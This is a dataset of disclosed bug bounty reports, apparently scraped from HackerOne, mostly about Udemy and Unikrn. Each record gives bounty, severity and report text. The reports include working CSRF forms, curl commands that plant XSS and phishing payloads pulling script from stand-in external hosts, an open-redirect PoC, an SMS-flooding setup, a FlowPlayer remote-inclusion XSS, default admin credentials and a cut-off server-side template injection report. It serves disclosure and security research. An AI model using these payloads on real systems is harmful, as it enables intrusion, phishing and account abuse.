Udemy,1001-5000,0.0,10m-50m,$150.00,No value,0.0,Information Disclosure,Multiple sub domain are vulnerable because of leaking full path ,"digitalsurgn  submitted a report to Udemy.May 17th (8 years ago)At the following address i have found debug.log file disclose the application full path onthe server.
https://business.udemy.com/wp-content/debug.log
http://about.udemy.com/wp-content/debug.log
THe below URLs showing the version number of the application :
http://about.udemy.com/readme.html
http://about.udemy.com/wp-content/plugins/all-in-one-seo-pack/readme.txt",https://hackerone.com/reports/62778,California,United States,San Francisco,2015,5,17,11,19
Unikrn,11-50,0.0,1m-10m,$150.00,High,7.95,Cross-Site Request Forgery (CSRF),CSRF in Raffles Ticket Purchasing,"tolo7010  submitted a report to Unikrn.Sep 28th (5 years ago)Description:
An API endpoint get executed with no CSRF prevention, the endpoint did not verify session_id required in the post form. An attacker can crafted malicious form (Poc), which is executed by authenticated user action leading to huge balance lost.
Poc:
<!doctype html>
Code 359 BytesWrap lines Copy Download1<html>
2<head>
3</head> 
4<body>
5<form action=""https://unikrn.com/apiv2/raffle/enter"" method=""POST"" name=""myForm"">
6<input type=""hidden"" name=""raffle"" id=""raffle"" value=""4775"">
7<input type=""hidden"" name=""tickets"" id=""tickets"" value=""1"">
8<input type=""hidden"" name=""session_id"" id=""session_id"" value="""">
9<input value=""Submit"" type=""submit"""">
10</form>
11</body>
12</html>
Recommendations:

Implementing CSRF tokens.
Validate session_id on post form/JSON api input.",https://hackerone.com/reports/272588,Washington,United States,Bellevue,2017,9,28,4,8
Unikrn,11-50,0.0,1m-10m,$50.00,Medium,5.45,Open Redirect,[crm.unikrn.com] Open Redirect,"root0x0  submitted a report to Unikrn.Dec 14th (5 years ago)Hi
there is an open redirect vulnerable in crm.unikrn.com
POC
curl http://crm.unikrn.com//example.com/ -L -v
Response
Code 2.35 KiBWrap lines Copy Download1< HTTP/1.1 302 Moved Temporarily
2< Date: Thu, 14 Dec 2017 09:06:08 GMT
3< Transfer-Encoding: chunked
4< Connection: keep-alive
5< Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
6< Expires: Thu, 01 Jan 1970 00:00:01 GMT
7< Location: https://crm.unikrn.com//example.com/
8< Server: cloudflare-nginx
9< CF-RAY: 3cd0016601fb853e-HKG
10< 
11* Ignoring the response-body
12* Connection #0 to host crm.unikrn.com left intact
13* Issue another request to this URL: 'https://crm.unikrn.com//example.com/'
14*   Trying 104.20.9.41...
15* TCP_NODELAY set
16* Connected to crm.unikrn.com (104.20.9.41) port 443 (#1)
17* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
18* Server certificate: *.unikrn.com
19* Server certificate: RapidSSL SHA256 CA - G2
20* Server certificate: GeoTrust Primary Certification Authority - G3
21> GET //example.com/ HTTP/1.1
22> Host: crm.unikrn.com
23> User-Agent: curl/7.54.0
24> Accept: */*
25> 
26< HTTP/1.1 301 Moved Permanently
27< Date: Thu, 14 Dec 2017 09:06:13 GMT
28< Content-Type: text/html; charset=UTF-8
29< Transfer-Encoding: chunked
30< Connection: keep-alive
31< Set-Cookie: __cfduid=d42e68e619766e93f4ba615c19abf9eef1513242372; expires=Fri, 14-Dec-18 09:06:12 GMT; path=/; domain=.unikrn.com; HttpOnly
32< X-Powered-By: PHP/7.0.24
33< Set-Cookie: 839f76f7dca1d4c71482f5436e1aba22=3a92cdc4ad916ccb96391468d2ad7eda; path=/; HttpOnly
34< Cache-Control: no-cache
35< Location: //example.com
36< Server: cloudflare-nginx
37< CF-RAY: 3cd001795f3884a2-HKG
38< 
39* Ignoring the response-body
40* Connection #1 to host crm.unikrn.com left intact
41* Issue another request to this URL: 'https://example.com'
42* Rebuilt URL to: https://example.com/
43*   Trying 93.184.216.34...
44* TCP_NODELAY set
45* Connected to example.com (93.184.216.34) port 443 (#2)
46* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
47* Server certificate: www.example.org
48* Server certificate: DigiCert SHA2 High Assurance Server CA
49* Server certificate: DigiCert High Assurance EV Root CA
50> GET / HTTP/1.1
51> Host: example.com
52> User-Agent: curl/7.54.0
53> Accept: */*
54> 
55< HTTP/1.1 200 OK
56< Accept-Ranges: bytes
57< Cache-Control: max-age=604800
58< Content-Type: text/html
59< Date: Thu, 14 Dec 2017 09:06:13 GMT
60< Etag: ""359670651""
61< Expires: Thu, 21 Dec 2017 09:06:13 GMT
62< Last-Modified: Fri, 09 Aug 2013 23:54:35 GMT
63< Server: ECS (rhv/818F)
64< Vary: Accept-Encoding
65< X-Cache: HIT
66< Content-Length: 1270
Impact
open Redirect vulnerable",https://hackerone.com/reports/297803,Washington,United States,Bellevue,2017,12,14,9,10
Unikrn,11-50,0.0,1m-10m,$200.00,High,7.95,Cross-Site Request Forgery (CSRF),CSRF log victim into the attacker account,"tolo7010  submitted a report to Unikrn.Nov 26th (5 years ago)All the API endpoints (v1 & v2) reflect session_id to Set-Cookie response - which can lead victim to login attacker account, for example:
Request:
Code 487 BytesWrap lines Copy Download1POST /apiv1/ HTTP/1.1
2Host: unikrn.com
3User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://unikrn.com/games/lol/afreeca-freecs-v-griffin---best-of-3/31638
8Content-Type: application/json
9Application-Version: v3.9.1-1485-g57625f1
10Content-Length: 49
11Cookie: ...
12Connection: close
13
14{""session_id"":""ue9cpp0t2mitjpm0s45epj78l3kpig6j""}
Response:
Code 860 BytesWrap lines Copy Download1HTTP/1.1 202 Accepted
2Date: Sun, 26 Nov 2017 07:28:38 GMT
3Content-Type: application/json
4Content-Length: 148
5Connection: close
6Access-Control-Allow-Origin: *
7Access-Control-Max-Age: 86400
8Cache-Control: no-store, no-cache, must-revalidate
9CI: M-production C-1 V-1.2.0
10Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
11Expires: Thu, 19 Nov 1981 08:52:00 GMT
12Pragma: no-cache
13Set-Cookie: CW=ue9cpp0t2mitjpm0s45epj78l3kpig6j; expires=Wed, 06-Dec-2017 07:28:37 GMT; Max-Age=864000; path=/; domain=unikrn.com; secure; HttpOnly
14Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
15Vary: Origin
16X-XSS-Protection: 1; mode=block
17Server: cloudflare-nginx
18CF-RAY: 3c3b21cc1fb03415-HKG
19
20{""success"": false, ""error"": true, ""msg"": ""missing_parameter_apiv1"", ""msg_trans"": ""missing_parameter_apiv1"", ""code"": 666, ""flds"": null, ""data"": null}
Steps to reproduce:
Code 204 BytesWrap lines Copy Download11. The victim has logged out the site by himself or by (out of scope) logout-CSRF. 
22. Attacker log into his account and get his session id (CW=) to craft CSRF page.
33. Lead the victim to visit CSRF page.
Sample CSRF Page
Code 274 BytesWrap lines Copy Download1<!doctype html>
2<html>
3<head>
4</head> 
5<body>
6<form action=""https://unikrn.com/apiv1/"" method=""POST"">
7<input type=""hidden"" name=""session_id"" id=""session_id"" value=""cm8csktf7p485hmb7on32o5bm94nm71i""> <!-- attacker session_id -->
8<input type=""submit"""">
9</form>
10</body>
11</html>
Note this sample CSRF assumes the user has logged out from the site, and make sure you replace attacker session_id of your current logged in account to reproduce, then goto unikrn.com after visiting the CSRF-page. However a script can be created here to automated these tasks.
Impact
Log any victim into the attacker account, the attacker can create a similar account profile as the victim - with some information missing, and then social-engineering (e.g. email) user to provide personal information or current password.",https://hackerone.com/reports/293016,Washington,United States,Bellevue,2017,11,26,7,54
Unikrn,11-50,0.0,1m-10m,$200.00,High,7.95,Command Injection - Generic,HTML injection in email in unikrn.com,"coreyd97  submitted a report to Unikrn.Aug 21st (5 years ago)
NOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report! Please add the affected domain name in the Title of the report.

Summary: Referral emails sent from unikrn.com are vulnerable to HTML injection via the first name field.
Description: Due to a lack of sanitization and validation when posting to https://unikrn.com/apiv2/user/verify a user may set a number of profile fields to values which should not be acceptable. This allows for a possible XSS within the raffle areas of the website and HTML injection within the referral email sent by unikrn.com.
The user may insert a payload into the firstname field which is later used to generate the users 'callsign'. The callsign value is safely used in other locations in the site within ng-bind attributes however in the case of viewing a raffle winner, the value is instead transformed by the 'vartrans' directive. This directive permits html to be inserted as part of the ""raffle_winner_sidebar_body"" text and is done so without any sanitization. 
Therefore should a user set their first name as '<script src=\""https://external.com/xss.js\"" />' when the user wins a raffle, any visitor to that raffles page will result in the external script being loaded.
Alongside this XSS it was also found that should a user set their first name to a value containing a script tag, when a referral email is sent to an address, any email content after the script tag is ignored. As the field's maximum length is 256 characters, an attacker would have 248 characters to craft a malicious email or instead embed an image with the email content to allow for a larger word count. 
An example payload may be
<a href=\""https://attacker/phish.php\""><img src=\""https://attacker/content.jpg\""></a><script>
Remedies for this would include proper sanitization of user fields when processed by the verify page and when passed as arguments to the vartrans directive to prevent similar issues in future, as well as a more strict content security policy and the stripping of all html characters when using user input within parameters to be used within an email.
Steps To Reproduce:
XSS:

Use the provided curl command to set a users first name to an xss payload such as <script src=\""https://external2.com/xss.js\"" />
Win a raffle
Visit the raffles page once you have been announced as a winner.
## Email HTML Injection:
Use the provided curl command to set a users first name to a payload such as <a href=\""https://attacker/phish.php\""><img src=\""https://attacker/content.jpg\""></a><script>
Navigate to the profile page and send a referral email.

Supporting Material/References:
XSS

curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\""country\"":\""GB\"",\""firstname\"":\""<script src=\\""https://external2.com/xss.js\\\"" />\"", \""session_id\"":\""SESSION_ID\""}'  $'https://unikrn.com/apiv2/user/verify'

Email HTML Injection

curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\""country\"":\""GB\"",\""firstname\"":\""<a href=\\""https://attacker/phish.php\\""><img src=\\""https://attacker/content.jpg\\""></a><script>\"", \""session_id\"":\""SESSION_ID\""}'  $'https://unikrn.com/apiv2/user/verify'
1 attachment:F214633: Email_Content.png",https://hackerone.com/reports/262004,Washington,United States,Bellevue,2017,8,21,16,32
Unikrn,11-50,0.0,1m-10m,$25.00,Low,2.0,Violation of Secure Design Principles,Improper validation at Phone verification (possible cost increase + SMS SPAM attack),"nitesculucian  submitted a report to Unikrn.Aug 24th (5 years ago)
NOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report! Please add the affected domain name in the Title of the report.

Summary:
Improper validation at Phone verification is allowing an attacker to exhaust the SMS delivery system.
Description:
Improper validation at Phone verification is allowing an attacker to exhaust the SMS delivery system probably increasing the cost of the subscription for that SMS service.  
Also this can be used as a SMS SPAM Attack! (I am spamming myself at the moment at a rate of 1 SMS per 2 minutes .... using over a few hundred SMS's .. f*ck!)
Browsers Verified In:

Chrome
Firefox

Steps To Reproduce:

Log in
Enter mobile  number of you target/victim (you, if you want to rage a few minutes later)
Verify 
Intercept request of resend
Edit request

Code 525 BytesWrap lines Copy Download1POST /apiv2/user/verifytelephone HTTP/1.1
2Host: unikrn.com
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Referer: https://unikrn.com/profile
7Content-Type: application/json
8Application-Version: v3.8.5-28-g570b4be
9Content-Length: 60
10Cookie: __cfduid=d4df1b78e117c6c9c5fd1fdd774c758ed1503574524; CW=hkp8at5qvoeijvet63q3iei9qcsn7dff
11Connection: close
12
13{""session_id"":""lcso6bc6vv2jcf7ebukdfgrfm3s38v6a"",""resend"":1}

Sent to intruder and grep ""1"" as follows:

Code 527 BytesWrap lines Copy Download1POST /apiv2/user/verifytelephone HTTP/1.1
2Host: unikrn.com
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Referer: https://unikrn.com/profile
7Content-Type: application/json
8Application-Version: v3.8.5-28-g570b4be
9Content-Length: 60
10Cookie: __cfduid=d4df1b78e117c6c9c5fd1fdd774c758ed1503574524; CW=hkp8at5qvoeijvet63q3iei9qcsn7dff
11Connection: close
12
13{""session_id"":""lcso6bc6vv2jcf7ebukdfgrfm3s38v6a"",""resend"":§1§}

Make a count integer and send. 
DO NOT VALIDATE PHONE
Wait 22 minutes (no joke)
Edit account information
Save
SPAM + Possible cost increase

= !<number of resend/integer number in intruder>
Supporting Material/References:

List of printscreen

Fun Request moment:

Can you stop the SMS's? I am going to the mountain side and I will not have a charger or any kind of charging options.
5 attachments:F215540: photo_2017-08-24_17-08-45.jpgF215541: photo_2017-08-24_17-08-40.jpgF215542: photo_2017-08-24_17-08-49.jpgF215543: photo_2017-08-24_17-09-34.jpgF215544: photo_2017-08-24_17-09-38.jpg",https://hackerone.com/reports/263010,Washington,United States,Bellevue,2017,8,24,14,15
Unikrn,11-50,0.0,1m-10m,$100.00,Low,2.0,Information Exposure Through an Error Message,Lack of Input sanitization leads to database Character encoding configuration Disclosure,"l_user  submitted a report to Unikrn.May 5th (3 years ago)Summary:
Email Input field during Register is not properly sanitized leads to sql error 
 Steps To Reproduce:
During Register use '💩' character in email field
Impact
Information Exposure Through an Error Message
███████",https://hackerone.com/reports/866271,Washington,United States,Bellevue,2020,5,5,6,59
Unikrn,11-50,0.0,1m-10m,$50.00,Medium,5.45,Information Disclosure,Non-Cloudflare IPs allowed to access origin servers,"moritz30  submitted a report to Unikrn.Aug 3rd (5 years ago)Summary: Non-Cloudflare IPs allowed to access origin servers
Description: Your origin servers are not blocking access from non-Cloudflare servers. This way crawlers can find your origin servers' IPs by checking random IPs until they found your origin server(s).
What makes this especially easy are tools like censys.io (which can find your origin servers).
One of the origin server IPs I found is ███████ but there were quite a few others, too.
This attack vector can be extremely bad because with the IP found out an attacker could attack the servers by DDoS or other attacks without being stopped by CloudFlare.]",https://hackerone.com/reports/255978,Washington,United States,Bellevue,2017,8,3,1,59
Unikrn,11-50,0.0,1m-10m,$50.00,No value,0.0,Open Redirect,Open Redirection leads to redirect Users to malicious website,"bb00x  submitted a report to Unikrn.Jun 22nd (3 years ago)
Summary
I found an open redirect bug on unikoingold.com .First, I create an account on unikoingold.com , I fill all the forms with the required information (First name,Birth,etc...), until I came on the final step to verify my account , there was a mechanism to send a verification link to my email , therefore ,I open my email an click to this LINK to confirm my account and using burp suite proxy to see what traffic is passed into this request so I came over this url https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/../&utm_medium=doi&utm_campaign=doi_welcome then I try to play with l parametre until I have redirection to my input (Malicious website with XSS code executed).

Steps

Create An account on unikoingold.com .
Set up your Burp suite proxy with your browser .
Intercept the request Like This :

Code 668 BytesWrap lines Copy Download1GET /s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f&utm_medium=doi&utm_campaign=doi_welcome HTTP/1.1
2Host: unikrn.com
3Connection: close
4Upgrade-Insecure-Requests: 1
5User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
6Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
7Accept-Encoding: gzip, deflate
8Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
9Cookie: __cfduid=dc2e81d88677939ce456f73a18c2a09b51561192429; CW=fplg5rn6s118blhgpb20hi0phlhuv4jr
4 . Note the Value of l parametre
5 . Or just Click on this URL POC You must be logged in
6 . Redirected successfully and Javascript code Executed .

POC

https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/../&utm_medium=doi&utm_campaign=doi_welcome
https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=///localdomain.pw/%2e%2e%2f&utm_medium=doi&utm_campaign=doi_welcome

Video F514634: 2019-06-22_11-47-15.mp4 839.07 KiBZoom in Zoom out Copy Download

Impact


An Attacker can redirect user to a malicious website and execute some dangerous script to steal credentiels .


Simplifies pishing Attacks .

1 attachment:F514634: 2019-06-22_11-47-15.mp4decrypted Unikrn staff  updated the severity from high to none. Jun 24th (3 years ago)decrypted Unikrn staff  closed the report and changed the status to Resolved. Jul 9th (3 years ago)Unikrn  rewarded bb00x with a $50 bounty. Jul 9th (3 years ago)bb00x   posted a comment. Jul 9th (3 years ago)thank you for the bounty @Unikrnbb00x   requested to disclose this report. Apr 6th (3 years ago)  This report has been disclosed. May 6th (3 years ago)",https://hackerone.com/reports/625546,Washington,United States,Bellevue,2019,6,22,9,51
Unikrn,11-50,0.0,1m-10m,$30.00,Low,2.0,Cross-site Scripting (XSS) - Generic,Persistent XSS found on bin.pinion.gg due to outdated FlowPlayer SWF file with Remote File Inclusion vulnerability.,"sp1d3rs  submitted a report to Unikrn.Jul 28th (5 years ago)Description
Hi. Today i looked to some outscope subdomains *.pinion.gg for recon purposes.
I discovered an interesting file on http://templ4d2.pinion.gg/motd2.manifest with next content:
Code 599 BytesWrap lines Copy Download1CACHE MANIFEST
2# 2014-07-07
3CACHE:
4http://bin.pinion.gg/bin/companions.min.js
5http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
6http://vox-static.liverail.com/crossdomain.xml
7http://cdn-static.liverail.com/crossdomain.xml
8http://bs.serving-sys.com/crossdomain.xml
9http://ad-apac.doubleclick.net/crossdomain.xml
10http://ads.intergi.com/crossdomain.xml
11http://u-ads.adap.tv/crossdomain.xml
12http://imasdk.googleapis.com/js/sdkloader/ima3.js
13http://www.googletagservices.com/tag/js/gpt.js
14https://www.google-analytics.com/ga.js
15http://partner.googleadservices.com/gpt/pubads_impl_90.js
16NETWORK:
17*
One string attracted my attention - http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
I submitted previously some vulnerabilities connected with this file to other programs, so easily determined that it is an outdated version of FlowPlayer (https://github.com/flowplayer/), vulnerable to XSS through remote file inclusion.
POC
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://████████/test.js
Just visit this link. Player will load my remote .js file from the my host, and display few popups with document.cookie and document.domain payloads.
Impact
The vulnerable file is hosted on out-scope subdomain, so i thinked, how it can affect security of main domains.
1) Using bin.pinion.gg deface. Because attacker can execute any JS, he can deface the page by arbitrary content
2) Using Open Redirect through window.location js payload.
3) Using setting cookie cross-domain. In this case the attacker can set arbitrary cookies to the pinion.gg or cp-ng.pinion.gg.
4) If this file is used in some instance to display some content, ads, etc. - then the instance is vulnerable to XSS.
Reproduction steps
You just need to place the malicious file to the remote host, like in this example:
http://████/test.js
and append the url to the
Code 65 BytesWrap lines Copy Download1http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=
as parameter.
Suggested fix
I recommend you to update FlowPlayer to the latest version, or remove if not used.Summary by sp1d3rsThanks to the Unikrn team for the fast response, fix, and the bounty!
I discovered the Flash XSS issue on the one of the pinion.gg subdomains.
The XSS issue was in the outdated FlowPlayer SWF file (which suffered from some ExternalInterface.Call/clientside RFI-related issues), and was exploitable using next JS (we can call it test.js), placed on remote host, and then referenced in config URL param:
Code 525 Bytes1{
2    'log' : {
3        'level'  : 'info'
4    },
5    'clip': {
6        'autoPlay': 'true',
7        'baseUrl': 'http://stream.flowplayer.org/',
8        'onMyConnectionEvent': 'function(clip, info) {alert(/onMyConnectionEvent/)};',
9        'onStart': 'function() {alert(/onBegin/);}' 
10    },
11    'playlist': [ 
12    ],
13    'plugins': { 
14        'controls': { 
15            'url': 'http://yourhost.com/xss.swf' 
16        }
17    },
18    'onLoad': 'function() {alert(/onLoad/);}',
19    'connectionCallbacks': [ ""onMyConnectionEvent"" ]
20}
where http://yourhost.com/xss.swf - it is specially crafted SWF file, which execute arbitrary JS through ExternalInterface.Call method.
Using 
Code 94 Bytes1http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted.com]/test.js
it was possible to execute any arbitrary JS in the context of subdomain.
I named it as persistent in the report title, because payload was in the stored form, but just 'flash xss' sounds more correctly. It could be turned to persistent, in case that config param actually was used somewhere.
References

https://github.com/flowplayer/flash/issues/263
http://mihai.bazon.net/blog/externalinterface-is-unreliable
Show more",https://hackerone.com/reports/254269,Washington,United States,Bellevue,2017,7,28,13,50
Unikrn,11-50,0.0,1m-10m,$30.00,Low,2.0,Violation of Secure Design Principles,"Rate-limit protection get executed in the last stage of the registration process, allowing enumeration of existing account.","tolo7010  submitted a report to Unikrn.Aug 24th (5 years ago)Summary:
This may be low risk impact but I need to suggest on improvement on your existing rate-limit protection on the registration page, It is an easy workaround and make the current protection more secure.
Description:
Unikrn increases the registration security by requiring user to enter a secured password and providing a rate limit on registration, after several attempt the server denies over-registration by returning ""Suspicious Activity - Multiple Accounts Detected. Please contact support at support@unikrn.com with further questions"". However the rate limit get executed in the last stage of the registration process, still allows the attacker to enumerate account on this page. 
Steps To Reproduce:

Go to https://unikrn.com/ and click ""Sign up""
Fill in the registration form
Upon submitting the form, use proxy (burp) to intercept the connection and send to repeater

After the research - except the normal successfully registration, we can categorize the server responses into 3 cases (in the following log from burp repeater):
Request/Response Case 1 - Existing email with secured password, the server returns message ""Email address already registered"":
[REQUEST]:
POST /apiv1/register HTTP/1.1
Host: unikrn.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: application/json, text/plain, /
Accept-Language: en-US,en;q=0.5
Referer: https://unikrn.com/
Content-Type: application/json
Application-Version: v3.8.5-28-g570b4be
Content-Length: 161
Cookie: [Long Cookie CUT]
Connection: close
{""email_address"":""hackerone1@gmail.com"",""day"":""1"",""month"":""1"",""year"":""1999"",""state"":null,""password"":""a12345678"",""password_confirm"":""a12345678"",""session_id"":null}
[RESPONSE]:
HTTP/1.1 200 OK
Date: Thu, 24 Aug 2017 02:38:22 GMT
Content-Type: application/json
Connection: close
Access-Control-Max-Age: 86400
Cache-Control: no-store, no-cache, must-revalidate
CI: M-production C-1 V-1.2.0
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Set-Cookie: CW=ghocb7rti601hf8k9valkk6r0mq2fua2; expires=Sun, 03-Sep-2017 02:38:22 GMT; Max-Age=864000; path=/; domain=.unikrn.com; secure; HttpOnly
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
Vary: Origin
X-XSS-Protection: 1; mode=block
Server: cloudflare-nginx
CF-RAY: 3932ef5ab9ab3198-SIN
Content-Length: 174
{""error"":true,""success"":false,""msg"":""Email address already registered."",""msg_trans"":""Email address already registered."",""data"":null,""code"":124,""flds"":null,""flds_errors"":null}
Request/Response Case 2 - Non-Existence email with secured password - after several attempts the server block the registration by sending the message ""Suspicious Activity - Multiple Accounts Detected. Please contact support at support@unikrn.com with further questions"".
[RESPONSE - header omitted]:
{""success"": false, ""error"": true, ""msg"": ""Suspicious Activity - Multiple Accounts Detected. Please contact support at support@unikrn.com with further questions."", ""msg_trans"": ""Suspicious Activity - Multiple Accounts Detected. Please contact support at support@unikrn.com with further questions."", ""code"": 0, ""flds"": null, ""data"": null}
Request/Response Case 3 - Non Existence with unsecured password - the server returns a message ""Password must be at least 8 characters long and contain one capital letter and one number"".
REQUEST - header omitted
{""email_address"":""hackerone9@gmail.com"",""day"":""1"",""month"":""1"",""year"":""1999"",""state"":null,""password"":""12345678"",""password_confirm"":""12345678"",""session_id"":null}
[RESPONSE - header omitted]:
{""error"":true,""success"":false,""msg"":""password_invalid"",""msg_trans"":""Password must be at least 8 characters long and contain one capital letter and one number."",""data"":null,""code"":0,""flds"":null,""flds_errors"":null}
Analyze the registration process:
As we can see from the server response, if we provide existing email the server responses ""Case 1"", if we provide non-existence email the server responses ""Case 2"" and ""Case 3"" just by the secured password condition: if we enter secured password Case 2 will be returned, else returns Case 3. From this we can analyze the registration process as:

The user fill in the form and send data to the server
The server receives request from the client and do the following task in order:


Check if email provided already in the database, if true -> return Case 1 and end the process. (Impact: user enumeration)
Check if password provided are secured (one char+numbers = 8 chars min), if false -> return Case 3 and end the process. (Impact: user enumeration)
[Rate-limit protection] Check if the attempt count reach limit, if true -> return Case 2 and end the process. (Impact: user enumeration)
If the above test pass, register the new user and return successful page.

Recommendation:
the rate-limit protection must be place on the first stage of processing, this is to disable user enumeration attack:

The user fill in the form and send data to the server
The server receives request from the client and do the following task in order:


[Rate-limit protection] Check if the attempt count reach limit, if true -> return Case 2 and end the process. (No user enumeration impact: not knowing whether the email are existing or not)
Check if email provided already in the database, if true -> return Case 1 and end the process. 
Check if password provided are secured (one char+numbers = 8 chars min), if false -> return Case 3 and end the process. (Impact: user enumeration)
If the above test pass, register the new user and return successful page.

Optional improvement:

There is no CSRF token / Captcha in the registration page, this make the enumeration process even easier.

As I say this may be low risk, but the fix is easy and increase more security on the existing protection scheme.
Regards,
Tolo",https://hackerone.com/reports/262830,Washington,United States,Bellevue,2017,8,24,3,32
Unikrn,11-50,0.0,1m-10m,$25.00,No value,0.0,Cross-Site Request Forgery (CSRF),session_id is not being validated at email invitation endpoint,"tolo7010  submitted a report to Unikrn.Nov 23rd (5 years ago)session_id is not being validated at email invitation endpoint
request sample:
Code 448 BytesWrap lines Copy Download1POST /apiv1/inviteemail HTTP/1.1
2Host: unikrn.com
3User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://unikrn.com/profile
8Content-Type: application/json
9Application-Version: v3.9.1-1476-g6500a2c
10Content-Length: 51
11Cookie: ...
12Connection: close
13
14{""email"":""victim@email.com"",""session_id"":""""}
response sample:
Code 716 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Thu, 23 Nov 2017 14:26:58 GMT
3Content-Type: application/json
4Content-Length: 150
5Connection: close
6Access-Control-Allow-Origin: *
7Access-Control-Max-Age: 86400
8Cache-Control: no-store, no-cache, must-revalidate
9CI: M-production C-1 V-1.2.0
10Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
11Expires: Thu, 19 Nov 1981 08:52:00 GMT
12Pragma: no-cache
13Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
14Vary: Accept-Encoding
15Vary: Origin
16X-XSS-Protection: 1; mode=block
17Server: cloudflare-nginx
18CF-RAY: 3c24ce767b1e340f-HKG
19
20{""error"":false,""success"":true,""msg"":""We invited victim@email.com for you"",""msg_trans"":""We invited victim@email.com for you"",""data"":null}
CSRF Page:
Code 301 BytesWrap lines Copy Download1<!doctype html>
2<html>
3<head>
4</head> 
5<body>
6<form action=""https://unikrn.com/apiv1/inviteemail"" method=""POST"">
7<input type=""hidden"" name=""email"" id=""email"" value=""tololovejoi@hotmail.com"">
8<input type=""hidden"" name=""session_id"" id=""session_id"" value="""">
9<input type=""submit"">
10</form>
11</body>
12</html>
Impact
The victim email get filled on behalf of legitimated users visiting the CSRF page",https://hackerone.com/reports/292636,Washington,United States,Bellevue,2017,11,23,15,1
Unikrn,11-50,0.0,1m-10m,$100.00,Low,3.7,Improper Authentication - Generic,Staging Rabbitmq instance is exposed to the internet with default credentials,"albatraoz  submitted a report to Unikrn.Dec 7th (3 years ago)Description:
RabbitMQ is an open-source message-broker software (sometimes called message-oriented middleware) that originally implemented the Advanced Message Queuing Protocol (AMQP) and has since been extended with a plug-in architecture to support Streaming Text Oriented Messaging Protocol (STOMP), Message Queuing Telemetry Transport (MQTT), and other protocols.
The instance of the rabbitmq of unikrn is exposed to the internet with the default credentials guest:guest which has an administrative access.
Steps To Reproduce:

Visit ███████
Enter user as guest & password as guest.
Boom!! You are inside the management console of the rabbitmq of unikrn.

P.S I checked that the ssl certificates belong to domain *.dev.unikrn.space which proves that the instance belongs to unikrn and maybe used for production or development.
Mitigation
Don't expose the rabbitmq console on the internet & remove the default credentials.
Supporting Material/References:
Here is a screenshot of the list of queue
███
Impact
The impact is critical as the attacker can get hell lot of details by dumping the queues as the queues are having confidential details like sso details & api details for different assets. Also the default credential has the administrative access which can help the attacker to add a new queue, modify or delete an existing queue etc.Summary by albatraozCheckout this article :
https://medium.com/bugbountywriteup/using-shodan-better-way-b40f330e45f6
Shodan membership black friday offer of $1 helped alot ;)",https://hackerone.com/reports/753602,Washington,United States,Bellevue,2019,12,7,11,46
Unikrn,11-50,0.0,1m-10m,$400.00,No value,0.0,Code Injection,Urgent: Server side template injection via Smarty template allows for RCE,"yaworsk  submitted a report to Unikrn.Aug 29th (6 years ago)Hi All,
I've found an issue which has allowed me to execute file_get_contents and extract your /etc/passwd file.
Description
It appears as though you are using smarty on the backend for templating. Entering a malicious payload as my firstname, lastname and nickname and then inviting a user to join the site results in the code being executed.
